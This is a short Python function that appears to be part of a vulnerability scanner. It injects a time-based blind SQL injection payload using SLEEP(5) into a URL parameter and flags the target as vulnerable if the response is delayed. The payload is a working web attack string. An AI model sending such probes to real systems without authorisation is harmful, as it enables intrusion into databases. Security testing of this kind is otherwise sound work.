import logging

import requests
import time

logger = logging.getLogger(__name__)

def check_blind_sqli(url,parameter_name):
    payload = "' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a) AND '1'=1"
    separator = "&" if "?" in url else "?"
    final_url = f"{url}{separator}{parameter_name}={payload}"

    try:
        start_time = time.time()
        response = requests.get(final_url,timeout=10)
        end_time = time.time()
        duration = end_time - start_time

        if duration >= 5:
            logger.info(f"[!!!] BLIND SQLi VULNERABILITY: {url}")
            logger.info(f"      Parameter: {parameter_name} cause a {duration: .2f}s delay.")
            return True
    except requests.exceptions.RequestException:
        pass
    return False